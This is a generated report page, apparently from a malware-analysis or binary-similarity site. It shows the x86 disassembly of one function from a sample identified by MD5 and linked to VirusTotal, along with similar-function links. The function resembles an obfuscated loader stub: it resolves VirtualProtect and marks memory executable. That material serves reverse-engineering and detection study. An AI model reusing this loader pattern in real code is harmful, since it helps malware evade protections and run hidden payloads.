---
layout: post
title:  "fcn.00401000 @ eb7f7fa38880dd66bab8caf5987e5b1a"
date:   2021-08-30 15:52:19 +0300
categories: report
index: false
---

# Generic Information
- **Function:** fcn.00401000
- **Origin (md5):** eb7f7fa38880dd66bab8caf5987e5b1a
- **VirusTotal:** [virustotal.com/gui/file/eb7f7fa38880dd66bab8caf5987e5b1a][virustotal_ref]

# Code Tags
<span class="tag" id="LINKING">LINKING</span>
<span class="tag" id="MEMORY">MEMORY</span>


# Similar Functions

1. [fcn.103b7d40][similar_1_ref] (sim.: 0.9019908455783237)
2. [fcn.100bb0a0][similar_2_ref] (sim.: 0.9003817004417378)
3. [fcn.6408be10][similar_3_ref] (sim.: 0.8895321536453973)
4. [fcn.004a6290][similar_4_ref] (sim.: 0.8841924066160197)
5. [fcn.004e0c20][similar_5_ref] (sim.: 0.8841924066160197)


# Disassembled Code

{% highlight nasm %}
sub esp,0x28
mov eax,dword[0x422050]
xor eax,esp
mov dword[esp+0x24],eax
mov ecx,dword[esp+0x2c]
mov eax,dword[0x422fa4]
lea edx,[eax+ecx-0xbb]
cmp edx,0x12ef
mov dx,word[0x422f78]
jb 0x40103a
movzx eax,dx
sub eax,ecx
sub eax,0x5b
mov dword[0x422fa4],eax
mov cl,byte[0x422f78]
sub cl,al
mov eax,dword[0x420eb0]
mov dword[esp+0x10],eax
mov eax,dword[0x420eb4]
mov dword[esp+0x14],eax
mov eax,dword[0x420eb8]
sub cl,byte[0x422f76]
mov dword[esp+0x18],eax
mov eax,dword[0x420ebc]
mov dword[esp+0x1c],eax
mov ax,word[0x420ec0]
mov word[esp+0x20],ax
movzx eax,dx
mov dword[esp+4],eax
imul eax,eax,0x23bf
push ebx
mov bx,word[0x422f74]
cdq
push ebp
push esi
mov esi,eax
sub esi,dword[0x422fa8]
push edi
movzx eax,bx
mov edi,edx
sbb edi,dword[0x422fac]
cdq
mov byte[0x422f76],cl
mov dword[0x422fa8],esi
mov dword[0x422fac],edi
mov dword[esp+0x10],0x2a
mov dword[esp+0x18],eax
mov dword[esp+0x1c],edx
jmp 0x4010d7
mov bx,word[0x422f74]
cmp dword[esp+0x18],esi
jne 0x4010e3
cmp dword[esp+0x1c],edi
je 0x401136
mov edx,0x180
cmp bx,dx
je 0x401136
movzx eax,bx
push 0xffffffffffffffff
add eax,0xc
cdq
push 0xfffffffffffffffe
push edx
push eax
call fcn.0040a0e0
push 0
push 2
push edi
push esi
mov ebx,eax
mov ebp,edx
call fcn.0040a0e0
mov cl,byte[0x422f76]
add ebx,eax
mov eax,dword[esp+0x10]
adc ebp,edx
add dword[0x422fb0],ebx
adc dword[0x422fb4],ebp
add eax,9
cmp eax,0x1636
mov dword[esp+0x10],eax
jl 0x4010d0
mov eax,dword[esp+0x14]
movzx ecx,cl
sub eax,ecx
sub eax,0x4c
cdq
xor esi,esi
push esi
mov dword[0x422fb4],edx
push esi
lea edx,[esp+0x28]
push edx
mov dword[0x422fb0],eax
call dword[sym.imp.KERNEL32.dll_LoadLibraryExW]
movzx ecx,byte[0x422f76]
mov edx,dword[0x422fa4]
sub edx,ecx
add edx,0xc
sub dword[0x422fa8],edx
mov dword[0x4b0c20],eax
sbb dword[0x422fac],esi
cmp eax,esi
je 0x4012c8
mov edx,dword[esp+0x10]
sub edx,ecx
add edx,0xc
sub dword[0x422fb0],edx
push str.VirtualProtect
push eax
sbb dword[0x422fb4],esi
call dword[sym.imp.KERNEL32.dll_GetProcAddress]
mov si,word[0x422f78]
mov ecx,dword[0x422fb0]
mov edi,eax
mov ax,si
shr ax,7
movzx eax,ax
cdq
cmp ecx,eax
jne 0x4011d0
mov eax,dword[0x422fb4]
cmp eax,edx
je 0x4011e0
mov eax,dword[0x422fa4]
movzx edx,si
add edx,ecx
lea ebx,[eax+edx-0x55]
jmp 0x4011ee
mov eax,dword[0x422fa4]
movzx edx,si
sub edx,ecx
lea ebx,[eax+edx-0xc]
mov dl,byte[0x422f76]
mov eax,dword[esp+0x10]
movzx bp,dl
add bp,ax
sub bp,0x55
add si,bp
mov dword[0x422fa4],ebx
mov word[0x422f78],si
test edi,edi
je 0x4012b1
sub cl,byte[0x422f74]
mov esi,dword[esp+0x3c]
add cl,byte[0x422f78]
mov edx,dword[0x4b0c1c]
add cl,bl
add cl,0x50
mov byte[0x422f76],cl
lea ecx,[esp+0x10]
push ecx
push 0x40
push esi
push edx
mov dword[esp+0x20],0x40
call edi
mov eax,dword[0x422fa4]
cmp eax,0x1c
je 0x401282
cmp eax,0x9f
je 0x401271
mov ecx,dword[0x422f78]
sub ecx,eax
lea esi,[eax+ecx*2-0x10b]
jmp 0x401293
sub eax,esi
mov si,word[0x422f78]
sub eax,0xc
add si,ax
jmp 0x401293
mov si,word[0x422f78]
lea edx,[eax+eax-0x4c]
mov dword[0x422fa4],edx
mov dl,byte[0x422f76]
mov eax,dword[esp+0x10]
movzx ecx,dl
lea ecx,[ecx+eax-0x55]
add dword[0x422fb0],ecx
adc dword[0x422fb4],0
movzx dx,dl
sub dx,ax
sub dx,0xc
add si,dx
mov word[0x422f78],si
jmp 0x4012cc
mov eax,dword[esp+0x10]
mov cl,byte[0x422f74]
sub cl,byte[0x422f78]
pop edi
sub cl,0x4c
pop esi
mov byte[0x422f76],cl
mov ecx,dword[esp+0x2c]
pop ebp
pop ebx
xor ecx,esp
call fcn.0040154b
add esp,0x28
ret
{% endhighlight %}


[similar_1_ref]: /report/fcn.103b7d40@2585b133c2e70968905cce13b1fc2654
[similar_2_ref]: /report/fcn.100bb0a0@89dc67d2f980e8488f97b1bf8cb24258
[similar_3_ref]: /report/fcn.6408be10@07e4412910bcf0f5969ef64c44eecb2d
[similar_4_ref]: /report/fcn.004a6290@be7fba7cc724acf4ae2900d99e0fc9c3
[similar_5_ref]: /report/fcn.004e0c20@279a61b1e76da49531f1f16fd1102a2d
[virustotal_ref]: https://www.virustotal.com/gui/file/eb7f7fa38880dd66bab8caf5987e5b1a